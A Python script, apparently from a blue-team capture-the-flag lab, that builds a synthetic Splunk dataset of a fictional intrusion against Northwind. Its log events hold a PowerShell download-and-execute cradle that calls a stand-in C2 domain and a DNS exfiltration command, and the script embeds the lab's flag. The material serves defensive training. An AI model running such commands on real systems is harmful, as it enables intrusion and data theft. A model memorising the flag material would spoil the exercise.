#!/usr/bin/env python3
"""
Data-forge de Overwatch — genera un dataset SIEM multi-fuente, determinista y
coherente, y lo ingesta en Splunk vía HEC (índice 'northwind').

El dataset cuenta UNA campaña de intrusión completa contra Northwind Global
Systems y reconcilia los IOCs de los tres labs atómicos del catálogo:
  - Plain Sight    -> credenciales de s.buchanan en el portal legacy (HTTP)
  - Ghost Protocol -> implante ghostclient.exe -> C2 cdn-edge-sync.net
  - Silent Harvest -> exfiltración DNS a sync-telemetry-cdn.net (base32)

Todo es SINTÉTICO (no hay datos reales) y REPRODUCIBLE (seed fija) para que las
respuestas del cuestionario sean estables. Se genera ruido benigno para que la
actividad maliciosa haya que buscarla de verdad con SPL.

La flag va incrustada en un Sysmon EventID=1 (PowerShell -EncodedCommand con un
blob base64 que decodifica a la flag). En el repo, OVERWATCH_FLAG es un DECOY;
el valor real se inyecta en CI desde un secret.
"""
import base64
import json
import os
import random
import time
import urllib.request
import urllib.error

# ─── Configuración ───────────────────────────────────────────────────────────
HEC_URL = os.environ.get("HEC_URL", "https://splunk:8088/services/collector/event")
HEC_TOKEN = os.environ.get("HEC_TOKEN", "00000000-0000-0000-0000-000000000000")
INDEX = os.environ.get("SPLUNK_INDEX", "northwind")
SEED = int(os.environ.get("FORGE_SEED", "1337"))
MGMT_URL = os.environ.get("SPLUNK_MGMT_URL", "https://splunk:8089")
SPLUNK_USER = os.environ.get("SPLUNK_USER", "admin")
SPLUNK_PASSWORD = os.environ.get("SPLUNK_PASSWORD", "Changeme123!")


def _load_flag():
    # La flag se hornea en la imagen (/seed/flag.txt). En el repo es un DECOY;
    # el valor real se inyecta en el build de CI desde un secret. El env
    # OVERWATCH_FLAG solo se usa para pruebas de mantenedor.
    v = os.environ.get("OVERWATCH_FLAG")
    if v:
        return v.strip()
    try:
        with open("/seed/flag.txt", "r", encoding="utf-8") as fh:
            return fh.read().strip()
    except OSError:
        return "NORTHWIND{th15_15_n0t_th3_r34l_fl4g}"


FLAG = _load_flag()

# ─── Canon (IOCs que reconcilian con los otros labs) ─────────────────────────
HOST = "NW-WKS-014"
HOST_IP = "10.30.14.14"
DOMAIN = "NWGLOBAL"
USER = "s.buchanan"
UPN = "s.buchanan@northwind-systems.com"
C2_DOMAIN = "cdn-edge-sync.net"
C2_IP = "45.83.220.17"
C2_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) GhostClient/2.3"
IMPLANT = r"C:\Users\s.buchanan\AppData\Local\Temp\ghostclient.exe"
DNS_EXFIL = "sync-telemetry-cdn.net"
DNS_RESOLVER = "10.66.6.66"
PAYROLL = r"C:\Finance\HR\payroll_Q3.csv"
ATTACKER_SIGNIN_IP = "45.83.220.9"      # misma /24 que el C2 (correlación)
BEACON_INTERVAL = 30                     # segundos exactos (determinista)
BEACON_COUNT = 40

random.seed(SEED)
rng = random.Random(SEED)

# Ventana temporal: la campaña ocurrió en la última hora (para "Last 24h").
T0 = time.time() - 3600
events = []


def add(sourcetype, ts, fields, source="northwind:forge"):
    events.append({
        "time": round(ts, 3),
        "host": fields.get("Computer", fields.get("host", HOST)),
        "source": source,
        "sourcetype": sourcetype,
        "index": INDEX,
        "event": fields,
    })


def b64(s):
    return base64.b64encode(s.encode()).decode()


# ─── Ruido benigno de fondo ──────────────────────────────────────────────────
BENIGN_USERS = ["a.fuller", "j.leverling", "m.peacock", "l.callahan", "r.king", "svc_backup"]
BENIGN_HOSTS = ["NW-WKS-002", "NW-WKS-007", "NW-WKS-021", "NW-SRV-DC01", "NW-SRV-FS01"]
BENIGN_DOMAINS = [
    "www.microsoft.com", "outlook.office365.com", "clients.google.com",
    "cdn.jsdelivr.net", "update.windows.com", "teams.microsoft.com",
    "slack.com", "api.github.com", "ntp.ubuntu.com", "intranet.northwind-systems.com",
]
BENIGN_PROCS = [
    r"C:\Windows\System32\svchost.exe", r"C:\Program Files\Google\Chrome\chrome.exe",
    r"C:\Windows\explorer.exe", r"C:\Program Files\Microsoft Office\OUTLOOK.EXE",
    r"C:\Windows\System32\RuntimeBroker.exe",
]


def forge_noise():
    # Logons normales (WinEventLog:Security 4624) repartidos por la flota
    for i in range(120):
        ts = T0 + rng.uniform(0, 3300)
        u = rng.choice(BENIGN_USERS)
        h = rng.choice(BENIGN_HOSTS)
        add("WinEventLog:Security", ts, {
            "EventCode": 4624, "Computer": h, "Account_Name": u,
            "Logon_Type": rng.choice([2, 3, 7]),
            "Source_Network_Address": f"10.30.{rng.randint(1,40)}.{rng.randint(2,254)}",
            "signature": "An account was successfully logged on",
        })
    # DNS benigno (zeek:dns)
    for i in range(200):
        ts = T0 + rng.uniform(0, 3300)
        add("zeek:dns", ts, {
            "id.orig_h": f"10.30.{rng.randint(1,40)}.{rng.randint(2,254)}",
            "query": rng.choice(BENIGN_DOMAINS), "qtype_name": "A",
            "rcode_name": "NOERROR",
        })
    # Proceso benigno (Sysmon 1)
    for i in range(150):
        ts = T0 + rng.uniform(0, 3300)
        img = rng.choice(BENIGN_PROCS)
        add("Sysmon", ts, {
            "EventID": 1, "Computer": rng.choice(BENIGN_HOSTS),
            "Image": img, "CommandLine": img,
            "ParentImage": r"C:\Windows\System32\services.exe",
            "User": f"{DOMAIN}\\{rng.choice(BENIGN_USERS)}",
            "ProcessId": rng.randint(1000, 9000),
        })
    # Proxy web benigno
    for i in range(180):
        ts = T0 + rng.uniform(0, 3300)
        d = rng.choice(BENIGN_DOMAINS)
        add("proxy:web", ts, {
            "src": f"10.30.{rng.randint(1,40)}.{rng.randint(2,254)}",
            "dest_host": d, "url": f"https://{d}/", "http_method": "GET",
            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0) Chrome/121.0",
            "status": 200,
        })
    # Sign-ins AAD benignos
    for i in range(60):
        ts = T0 + rng.uniform(0, 3300)
        u = rng.choice(BENIGN_USERS)
        add("azuread:signin", ts, {
            "userPrincipalName": f"{u}@northwind-systems.com",
            "ipAddress": f"88.24.{rng.randint(1,254)}.{rng.randint(1,254)}",
            "location": "Madrid, ES", "status": "success",
            "appDisplayName": "Office 365",
        })


# ─── Cadena de ataque (los eventos que el alumno debe encontrar) ─────────────
def forge_attack():
    t = T0 + 300  # la intrusión arranca a los 5 min de la ventana

    # ── Act 1 · Acceso inicial: sign-in sospechoso de s.buchanan desde IP del C2/24
    add("azuread:signin", t, {
        "userPrincipalName": UPN, "ipAddress": ATTACKER_SIGNIN_IP,
        "location": "Unknown", "status": "success",
        "appDisplayName": "Office 365", "riskLevel": "high",
        "note": "Impossible-travel vs prior Madrid sign-in",
    })
    # Logon interactivo en el endpoint
    add("WinEventLog:Security", t + 40, {
        "EventCode": 4624, "Computer": HOST, "Account_Name": USER,
        "Logon_Type": 2, "Source_Network_Address": HOST_IP,
        "signature": "An account was successfully logged on",
    })

    # ── Act 2 · Ejecución: macro -> powershell -> ghostclient.exe
    t += 120
    # PowerShell con EncodedCommand (aquí va la FLAG, codificada en base64)
    ps_script = (
        "$ErrorActionPreference='SilentlyContinue';"
        "IEX (New-Object Net.WebClient).DownloadString('http://" + C2_DOMAIN + "/a');"
        "# operator-note flag=" + FLAG
    )
    enc = b64(ps_script)
    add("Sysmon", t, {
        "EventID": 1, "Computer": HOST,
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": f"powershell.exe -nop -w hidden -EncodedCommand {enc}",
        "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "User": f"{DOMAIN}\\{USER}", "ProcessId": 6641,
    })
    # Drop + ejecución del implante
    add("Sysmon", t + 15, {
        "EventID": 11, "Computer": HOST, "Image": IMPLANT,
        "TargetFilename": IMPLANT, "User": f"{DOMAIN}\\{USER}",
    })
    add("Sysmon", t + 20, {
        "EventID": 1, "Computer": HOST, "Image": IMPLANT,
        "CommandLine": f"\"{IMPLANT}\" --sync",
        "ParentImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "User": f"{DOMAIN}\\{USER}", "ProcessId": 7710, "Hashes": "SHA256=8f14e45fceea"},
    )

    # ── Act 3 · C2 beaconing: cada 30s exactos a cdn-edge-sync.net
    beacon_start = t + 60
    for i in range(BEACON_COUNT):
        bt = beacon_start + i * BEACON_INTERVAL
        # Sysmon 3 (conexión de red del implante)
        add("Sysmon", bt, {
            "EventID": 3, "Computer": HOST, "Image": IMPLANT,
            "DestinationHostname": C2_DOMAIN, "DestinationIp": C2_IP,
            "DestinationPort": 443, "Protocol": "tcp",
            "User": f"{DOMAIN}\\{USER}",
        })
        # Proxy web (el check-in HTTP con el UA del implante)
        add("proxy:web", bt, {
            "src": HOST_IP, "dest_host": C2_DOMAIN, "dest_ip": C2_IP,
            "url": f"http://{C2_DOMAIN}/api/v2/status", "http_method": "GET",
            "http_user_agent": C2_UA, "status": 200, "bytes_out": 512,
        })
        # Zeek http corroborando
        add("zeek:http", bt, {
            "id.orig_h": HOST_IP, "id.resp_h": C2_IP, "host": C2_DOMAIN,
            "uri": "/api/v2/status", "method": "GET", "user_agent": C2_UA,
            "status_code": 200,
        })

    # ── Act 4 · Discovery
    dt = beacon_start + 200
    for cmd in [
        "whoami /all", "net group \"Domain Admins\" /domain",
        "nltest /dclist:northwind", "systeminfo",
    ]:
        add("Sysmon", dt, {
            "EventID": 1, "Computer": HOST,
            "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": cmd,
            "ParentImage": IMPLANT, "User": f"{DOMAIN}\\{USER}",
            "ProcessId": rng.randint(8000, 9000),
        })
        dt += 20

    # ── Act 5 · Collection: lectura del fichero de nóminas
    ct = dt + 30
    add("Sysmon", ct, {
        "EventID": 1, "Computer": HOST,
        "Image": r"C:\Windows\System32\cmd.exe",
        "CommandLine": f"cmd.exe /c copy \"{PAYROLL}\" %TEMP%\\p.dat",
        "ParentImage": IMPLANT, "User": f"{DOMAIN}\\{USER}", "ProcessId": 8802,
    })
    add("WinEventLog:Security", ct + 5, {
        "EventCode": 4663, "Computer": HOST, "Account_Name": USER,
        "Object_Name": PAYROLL, "Accesses": "ReadData",
        "signature": "An attempt was made to access an object",
    })

    # ── Act 6 · Exfiltración DNS (base32) a sync-telemetry-cdn.net
    et = ct + 60
    add("Sysmon", et, {
        "EventID": 1, "Computer": HOST,
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": ("powershell.exe -c \"$d=[IO.File]::ReadAllBytes('%TEMP%\\p.dat');"
                        "$b32=ConvertTo-Base32 $d; foreach($c in $b32){Resolve-DnsName "
                        "\\\"$c." + DNS_EXFIL + "\\\"}\""),
        "ParentImage": IMPLANT, "User": f"{DOMAIN}\\{USER}", "ProcessId": 9014,
    })
    # Consultas DNS de exfil (Sysmon 22 + zeek:dns), subdominios base32 de alta entropía
    b32alpha = "abcdefghijklmnopqrstuvwxyz234567"
    for i in range(60):
        label = "".join(rng.choice(b32alpha) for _ in range(48))
        qt = et + 5 + i * 0.5
        add("Sysmon", qt, {
            "EventID": 22, "Computer": HOST, "Image": IMPLANT,
            "QueryName": f"d{i:04d}.{label}.{DNS_EXFIL}", "QueryStatus": 0,
            "User": f"{DOMAIN}\\{USER}",
        })
        add("zeek:dns", qt, {
            "id.orig_h": HOST_IP, "query": f"d{i:04d}.{label}.{DNS_EXFIL}",
            "qtype_name": "A", "rcode_name": "NOERROR", "answers": DNS_RESOLVER,
        })


# ─── Ingesta por HEC ─────────────────────────────────────────────────────────
def wait_for_hec(retries=60):
    health = HEC_URL.replace("/services/collector/event", "/services/collector/health")
    ctx = _ssl_ctx()
    for _ in range(retries):
        try:
            req = urllib.request.Request(health)
            urllib.request.urlopen(req, timeout=4, context=ctx)
            return
        except urllib.error.HTTPError as e:
            if e.code in (200, 400):  # health responde
                return
            time.sleep(3)
        except Exception:
            time.sleep(3)
    raise SystemExit("[forge] HEC no respondió a tiempo")


def _ssl_ctx():
    import ssl
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


def _auth_header():
    import base64 as _b64
    tok = _b64.b64encode(f"{SPLUNK_USER}:{SPLUNK_PASSWORD}".encode()).decode()
    return {"Authorization": f"Basic {tok}"}


def ensure_index(retries=60):
    """Crea el índice vía REST (idempotente). El app-mount no es fiable en todos
    los entornos, así que el forge garantiza que el índice existe."""
    url = f"{MGMT_URL}/services/data/indexes"
    ctx = _ssl_ctx()
    for _ in range(retries):
        try:
            data = f"name={INDEX}".encode()
            req = urllib.request.Request(url, data=data, headers=_auth_header())
            urllib.request.urlopen(req, timeout=8, context=ctx).read()
            print(f"[forge] índice '{INDEX}' creado.", flush=True)
            return
        except urllib.error.HTTPError as e:
            if e.code == 409:  # ya existe
                print(f"[forge] índice '{INDEX}' ya existe.", flush=True)
                return
            time.sleep(3)
        except Exception:
            time.sleep(3)
    raise SystemExit("[forge] no pude crear el índice (splunkd no respondió)")


def ship(batch):
    body = "\n".join(json.dumps(e) for e in batch).encode()
    req = urllib.request.Request(
        HEC_URL, data=body,
        headers={"Authorization": f"Splunk {HEC_TOKEN}", "Content-Type": "application/json"},
    )
    urllib.request.urlopen(req, timeout=20, context=_ssl_ctx()).read()


def main():
    print(f"[forge] generando dataset (seed={SEED}) ...", flush=True)
    forge_noise()
    forge_attack()
    events.sort(key=lambda e: e["time"])
    print(f"[forge] {len(events)} eventos generados. Preparando Splunk...", flush=True)
    ensure_index()
    wait_for_hec()
    print("[forge] HEC listo. Ingestando...", flush=True)
    for i in range(0, len(events), 200):
        ship(events[i:i + 200])
    print(f"[forge] ingesta completada: {len(events)} eventos en index={INDEX}.", flush=True)
    # Marca de finalización para verify.sh
    with open("/tmp/forge_done", "w") as fh:
        fh.write(str(len(events)))


if __name__ == "__main__":
    main()
